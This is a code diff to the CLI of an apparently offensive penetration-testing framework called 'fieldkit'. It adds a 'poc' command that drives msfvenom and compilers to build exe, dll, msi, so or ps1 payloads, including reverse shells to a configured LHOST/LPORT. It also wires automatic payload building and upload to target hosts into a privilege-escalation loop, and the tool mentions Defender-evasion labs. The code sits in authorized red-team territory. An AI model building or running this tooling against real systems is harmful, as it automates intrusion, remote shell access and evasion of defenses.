@@ -26,8 +26,8 @@ from . import (__version__, adcs as adcs_mod, arsenal as arsenal_mod,
                evasion as evasion_mod,
                executor as executor_mod, hostenum as hostenum_mod, ingest as ingest_mod,
                kb as kb_mod, kerberos as kerberos_mod, lab as lab_mod,
-               privesc as privesc_mod, report as report_mod, scope as scope_mod,
-               spray as spray_mod)
+               poc as poc_mod, privesc as privesc_mod, report as report_mod,
+               scope as scope_mod, spray as spray_mod)
 from .errors import ConfirmationError, FieldkitError
 from .state import DB_ENV_VAR, Store, default_db_path
 
@@ -478,6 +478,14 @@ def _host_vectors(store, cfg, host_ip):
             if v.host == host_ip]
 
 
+def _build_dir():
+    """A scratch dir for artifacts fieldkit builds mid-loop (attacker-side)."""
+    d = os.path.join(os.environ.get("FIELDKIT_BUILD", os.path.join(
+        os.path.expanduser("~"), ".fieldkit", "build")))
+    os.makedirs(d, exist_ok=True)
+    return d
+
+
 def cmd_escalate(args):
     if args.rules:
         print(escalate_mod.describe_policy())
@@ -519,6 +527,10 @@ def cmd_escalate(args):
             for name, _ in v.stages:
                 have = "in arsenal" if arsenal_mod.find(name) else "NOT staged"
                 marks.append(f"auto-stage {name} ({have})")
+            for fmt, _ in v.builds:
+                have = f"{poc_mod.BUILDER.get(fmt, '?')} ready" if poc_mod.have(fmt) \
+                    else f"needs {poc_mod.BUILDER.get(fmt, 'a builder')}"
+                marks.append(f"auto-build {fmt} ({have})")
             mark = ("  (" + "; ".join(marks) + ")") if marks else ""
             print(f"  {v.key:<26} {v.axes:<18} {v.safety}{mark}")
         if not runnable:
@@ -572,11 +584,36 @@ def cmd_escalate(args):
                 done.append(f"{name}→{remote}")
             return escalate_mod.StageResult(True, "staged " + ", ".join(done))
 
+        arch = "x86" if cfg.get("arch") == "x86" else "x64"
+
+        def build(vector, corrected):
+            done = []
+            for fmt, remote in vector.builds:
+                use_arch = "x86" if (corrected and arch == "x64") else \
+                    ("x64" if corrected else arch)
+                out = os.path.join(_build_dir(), f"{vector.key.replace(':', '_')}.{fmt}")
+                bres = poc_mod.build(fmt, out, arch=use_arch,
+                                     lhost=cfg.get("lhost"), lport=cfg.get("lport"))
+                if not bres.ok:
+                    return escalate_mod.StageResult(False, bres.detail)
+                act = executor_mod.Action(
+                    host=host, cred=cred, command=None, label=f"build:{fmt}",
+                    safety="config-change", upload=(out, remote),
+                    creates=[(f"built {fmt} ({bres.tool}) at {remote}", f"del {remote}")])
+                res = executor_mod.execute(store, act, allow=allow,
+                                           on_event=lambda m: print(m))
+                if res.blocked or not res.ok:
+                    return escalate_mod.StageResult(
+                        False, res.blocked or f"upload of {fmt} failed")
+                done.append(f"{fmt}({bres.tool})→{remote}")
+            return escalate_mod.StageResult(True, "built+staged " + ", ".join(done))
+
         print("\n--- escalating ---")
         outcome = escalate_mod.escalate(
             vectors, fire=fire, allow=allow, os_name=host["os"], budget=budget,
             delivery_order=delivery_order, caught=caught, mark_caught=mark_caught,
-            stage=None if args.no_stage else stage, on_event=lambda m: print(m))
+            stage=None if args.no_stage else stage,
+            build=None if args.no_stage else build, on_event=lambda m: print(m))
 
         if outcome.ok:
             v = outcome.proven
@@ -613,6 +650,41 @@ def _print_escalation_outcome(outcome):
     else:
         print("no vector proved elevation — every ranked move was tried. See the trail "
               "for the per-vector verdict and its recommended manual step.")
+
+
+def cmd_poc(args):
+    if args.check:
+        print("build toolchain — which builders are installed:\n")
+        for tool, path in poc_mod.toolchain():
+            print(f"  {'OK ' if path else '-- '} {tool:<28} {path or 'not on PATH'}")
+        print("\nformats: " + ", ".join(f"{f} ({b})" for f, b in sorted(poc_mod.BUILDER.items())))
+        return 0
+    if not args.format:
+        _err("a format is required (exe|dll|msi|so|ps1), or --check the toolchain")
+        return 2
+    out = args.out or os.path.join(_build_dir(), f"payload.{args.format}")
+    if not poc_mod.have(args.format) and not args.source:
+        _err(f"{poc_mod.BUILDER.get(args.format, 'the builder')} for {args.format} is not "
+             "installed — `fieldkit poc --check`")
+        return 2
+    cfg = {}
+    if os.path.exists(_db_path(args)):  # poc works standalone; use lhost/lport if a db exists
+        try:
+            with _open_store(args) as store:
+                cfg = config_mod.load(store)
+        except FieldkitError:
+            pass
+    lhost = args.lhost or cfg.get("lhost")
+    lport = args.lport or cfg.get("lport")
+    res = poc_mod.build(args.format, out, arch=args.arch, command=args.command,
+                        lhost=lhost, lport=lport, source=args.source)
+    if not res.ok:
+        _err(f"build failed ({res.tool}): {res.detail}")
+        return 1
+    kind = "reverse shell" if (lhost and lport) else f"proof ({args.command or 'whoami/id'})"
+    print(f"built {res.fmt} via {res.tool}: {res.path}")
+    print(f"  payload: {kind}" + (f"  (arch {args.arch})" if args.format in ("exe", "dll") else ""))
+    return 0
 
 
 def cmd_lab_test(args):
@@ -1126,13 +1198,33 @@ def build_parser():
     p_esc.add_argument("--max", type=int, metavar="N",
                        help=f"cap vectors fired (default {escalate_mod.DEFAULT_BUDGET})")
     p_esc.add_argument("--no-stage", action="store_true",
-                       help="don't auto-stage a missing artifact from the arsenal on a miss")
+                       help="don't auto-stage/build a missing artifact on a miss")
     p_esc.add_argument("--dry-run", action="store_true",
                        help="print the ranked plan and exit without firing")
     p_esc.add_argument("--rules", action="store_true",
                        help="print the axis→action policy table and exit")
     p_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
     p_esc.set_defaults(func=cmd_escalate)
+
+    p_poc = sub.add_parser(
+        "poc", help="build a payload artifact (msi/exe/dll/so/ps1) by driving the toolchain",
+        description="Drives the operator's builders (msfvenom/wixl/gcc/mingw) to produce "
+                    "an artifact a vector needs. Orchestration only — the bytes come from "
+                    "msfvenom or your --source; fieldkit templates benign scaffolding and "
+                    "builds a whoami/id proof by default (--lhost/--lport for a revshell). "
+                    "The escalate loop calls this automatically on a build-kind miss.")
+    p_poc.add_argument("format", nargs="?", choices=sorted(poc_mod.RECIPES),
+                       help="artifact format to build")
+    p_poc.add_argument("-o", "--out", metavar="PATH", help="output path (default: ~/.fieldkit/build)")
+    p_poc.add_argument("--arch", choices=["x64", "x86"], default="x64",
+                       help="target arch for exe/dll (default x64)")
+    p_poc.add_argument("--command", metavar="CMD",
+                       help="command the artifact runs (default: a whoami/id proof)")
+    p_poc.add_argument("--lhost", help="reverse-shell LHOST (msfvenom payload instead of a proof)")
+    p_poc.add_argument("--lport", help="reverse-shell LPORT")
+    p_poc.add_argument("--source", metavar="FILE", help="compile this .c with mingw (exe/dll)")
+    p_poc.add_argument("--check", action="store_true", help="report which builders are installed")
+    p_poc.set_defaults(func=cmd_poc)
 
     p_lab = sub.add_parser(
         "lab", help="prove evasion techniques against a Defender lab host")
